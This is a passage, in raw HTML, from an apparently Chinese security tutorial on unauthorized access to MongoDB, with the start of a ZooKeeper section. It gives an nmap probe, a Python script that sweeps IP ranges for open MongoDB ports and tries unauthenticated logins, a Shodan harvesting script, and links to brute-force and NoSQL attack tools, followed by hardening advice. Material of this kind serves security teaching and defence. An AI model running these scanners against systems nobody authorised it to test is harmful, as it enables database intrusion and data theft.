Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x03 MongoDB未授权访问</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">MongoDB 默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb 端口（默认 27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。</p><ul style="" class=" list-paddingleft-2"><li><p>使用默认 mongod 命令启动 Mongodb</p></li><li><p>机器可以被公网访问</p></li><li><p>在公网上开放了 Mongodb 端口</p></li><li><p>数据库隐私泄露</p></li><li><p>数据库被清空</p></li><li><p>数据库运行缓慢</p></li></ul><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1. 扫描探测</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">下载：http://nmap.org/svn/scripts/mongodb-info.nse<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">nmap</span> -<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 7px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">p</span> <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">27017</span> --script mongodb-info <span class="hljs-default-symbol" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 27px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">&lt;ip&gt;</span></code></pre></section><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.46694502435629787" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/15_tPYEGAkehGA6HAy1unJj9zeAiatQMg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUulw9Ngic4gxUqR5Z6tcicyutMibictPYEGAkehGA6HAy1unJj9zeAiatQMg/640?wx_fmt=png'" data-type="png" data-w="2874" style=""  /></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">vim /etc/mongodb.conf
dbpath = /data/
logpath = /var/logs/mongodb.log
##port = 27017
##fork = true
bind_ip = 0.0.0.0

./mongod –config mongodb.conf //启动mongodb加载配置mongodb.conf</code><br  /></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.1 基础</strong><br  />https://www.jianshu.com/p/8bf26effa737<br  />http://www.runoob.com/mongodb/mongodb-tutorial.html<br  />https://itbilu.com/database/mongo/E1tWQz4_e.html</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.2 批量扫描未授权</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">import socket
import sys
import pymongo

ipcons = []
def Scanner(ip):
 &nbsp; &nbsp;global ipcons
 &nbsp; &nbsp;sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 &nbsp; &nbsp;sk.settimeout(0.3)
 &nbsp; &nbsp;try:
 &nbsp; &nbsp; &nbsp; &nbsp;sk.connect((ip,27017))
 &nbsp; &nbsp; &nbsp; &nbsp;ipcons.append(ip)
 &nbsp; &nbsp; &nbsp; &nbsp;sk.close()
 &nbsp; &nbsp;except Exception:
 &nbsp; &nbsp; &nbsp; &nbsp;pass

def ip2num(ip):
 &nbsp; &nbsp;ip=[int(x) for x in ip.split('.')]
 &nbsp; &nbsp;return ip[0] &lt;&lt;24 | ip[1]&lt;&lt;16 | ip[2]&lt;&lt;8 |ip[3]

def num2ip(num):
 &nbsp; &nbsp;return '%s.%s.%s.%s' %( (num &amp; 0xff000000) &gt;&gt;24,
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(num &amp; 0x00ff0000) &gt;&gt;16,
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(num &amp; 0x0000ff00) &gt;&gt;8,
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;num &amp; 0x000000ff )

def get_ip(ip):
 &nbsp; &nbsp;start,end = [ip2num(x) for x in ip.split(' ') ]
 &nbsp; &nbsp;return [ num2ip(num) for num in range(start,end+1) if num &amp; 0xff ]

startIp = sys.argv[1]
endIp = sys.argv[2]
iplist = get_ip(sys.argv[1]+" "+sys.argv[2])
for i in iplist:
 &nbsp; &nbsp;Scanner(i)

def connMon(ip_addr):
 &nbsp; &nbsp;print ' Connect mongodb: ' + ip_addr + ':27017'
 &nbsp; &nbsp;try:
 &nbsp; &nbsp; &nbsp; &nbsp;conn = pymongo.MongoClient(ip_addr,27017,socketTimeoutMS=3000)
 &nbsp; &nbsp; &nbsp; &nbsp;dbname = conn.database_names()
 &nbsp; &nbsp; &nbsp; &nbsp;print "success"
 &nbsp; &nbsp;except Exception as e:
 &nbsp; &nbsp; &nbsp; &nbsp;print "error"

print ipcons &nbsp; 
for ipaddr in ipcons:
 &nbsp; &nbsp;connMon(ipaddr)
 &nbsp; &nbsp;print "================="</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.3 shodan扫描脚本</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">##!/usr/bin/python
## -*- coding: UTF-8 -*-
'''
@Author：joy_nick
@博客：http://byd.dropsec.xyz/
'''
import shodan
import os
iplist = []
ip_list = []
shodan_ip_list = []
def shodanSearch(keywords):
 &nbsp; &nbsp;SHODAN_API_KEY = "your key"
 &nbsp; &nbsp;api = shodan.Shodan(SHODAN_API_KEY)
 &nbsp; &nbsp;total = 0
 &nbsp; &nbsp;try:
 &nbsp; &nbsp; &nbsp; &nbsp;results = api.search(keywords)
 &nbsp; &nbsp; &nbsp; &nbsp;total = int(results['total'])
 &nbsp; &nbsp; &nbsp; &nbsp;for result in results['matches']:
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;##iplist.append({"ip":result['ip_str'],"country":result['location']['country_name']})
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;iplist.append(result['ip_str'])
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;for i in range(len(iplist)):
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ip_list = iplist[i].encode('utf-8')
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;shodan_ip_list.append(ip_list)
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s = '\n'.join(shodan_ip_list)
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;with open('shodan_ip_list.txt','w') as output:
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;output.write(s)
 &nbsp; &nbsp;except shodan.APIError, e:
 &nbsp; &nbsp; &nbsp; &nbsp;print 'Error: %s' % e
if __name__ == '__main__':
 &nbsp; &nbsp;shodanSearch('redis')</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">查询操作<br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.6139188069594035" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/16_cgAW0V7X8nZPiaDfcNFpnkLssFZEBA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUdIQYibByjpMsnTVF1kDdhGqDdfcgAW0V7X8nZPiaDfcNFpnkLssFZEBA/640?wx_fmt=png'" data-type="png" data-w="1207" style=""  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>2. 爆破脚本</strong><br  /></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://github.com/netxfly/x-crack<br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.49186351706036746" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/17_ADTdoBUREqbxtGCFZ7VP0frmwBQ5HA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUBWVvwdia9ckZZLl3az3yByicaicADTdoBUREqbxtGCFZ7VP0frmwBQ5HA/640?wx_fmt=png'" data-type="png" data-w="1905" style=""  /></p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>3. 攻击脚本</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">https://github.com/youngyangyang04/NoSQLAttack<br  />https://www.youtube.com/watch?v=R6-nXCVNxEw<br  />https://www.youtube.com/watch?v=R6-nXCVNxEw</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>4. 防范措施</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(1).新建管理账户开启MongoDB授权</strong><br  />新建终端[参数默认可以不加，若有自定义参数，才要加上，下同]<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">mongod <span class="hljs-default-comment" style="color: rgb(92, 99, 112);background: rgba(0, 0, 0, 0);display: inline;width: 204px;text-decoration: none solid rgb(92, 99, 112);font-weight: 400;font-style: italic;">--port 27017 --dbpath /data/db1</span></code></pre></section><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">另起一个终端，运行下列命令</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">mongo --port 27017

 &nbsp;use admin

 &nbsp;db.createUser(
 &nbsp; &nbsp;{
 &nbsp; &nbsp; &nbsp;user: "adminUser",
 &nbsp; &nbsp; &nbsp;pwd: "adminPass",
 &nbsp; &nbsp; &nbsp;roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]
 &nbsp; &nbsp;}
 &nbsp;)</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">管理员创建成功，现在拥有了用户管理员 用户名:adminUser 密码:adminPass</p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.5245441795231417" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/18_LibR1oeU0aQXVicc7GiblqUwqobLpQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUhvmYSxvKGBZIVw10iaudh4FiaOOArLibR1oeU0aQXVicc7GiblqUwqobLpQ/640?wx_fmt=png'" data-type="png" data-w="2852" style=""  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(2).本地访问</strong><br  />bind 127.0.0.1<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(3).修改默认端口</strong><br  />修改默认的mongoDB端口(默认为: TCP 27017)为其他端口</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>(4).禁用HTTP和REST端口</strong><br  />MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface = false<br  /><strong>(5).开启日志审计功能</strong><br  />审计功能可以用来记录用户对数据库的所有相关操作。这些记录可以让系统管理员在需要的时候分析数据库在什么时段发生了什么事情<br  /><strong>(6).开启auth认证</strong></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">/etc/mongodb.conf　　
auth = true</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">其他:http://www.mottoin.com/105609.html</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x04 ZooKeeper未授权访问</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">From:&nbsp;http://www.polaris-lab.com/index.php/archives/41/<br  />http://www.majunwei.com/category/201612011952003333/<br  />http://www.mottoin.com/92742.html<br  />http://cve.scap.org.cn/CVE-2014-0085.html<br  />http://ifeve.com/zookeeper_guidetozkoperations/<br  />http://blog.csdn.net/u011721501/article/details/44062617</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>1.扫描探测</strong></h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。<br  /></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 6px;overflow-x: auto;white-space: nowrap;" class="hljs-default">./zkCli.<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">sh</span> -server <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">127.0</span>.<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 20px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">0.1</span> <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">2181</span></code></pre></section><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.546875" data-s="300,640" src="图片/HACK学习呀_2019-02-19_WIKI未授权访问的tips/19_GvsH2eOiak9hNCheKv49bX3rPdbnSg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou885UEWicMXcV5cRJVQcyiaBUDDmiaLmibbZib2404LbcVZnQls6CGvsH2eOiak9hNCheKv49bX3rPdbnSg/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-top: 0px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: 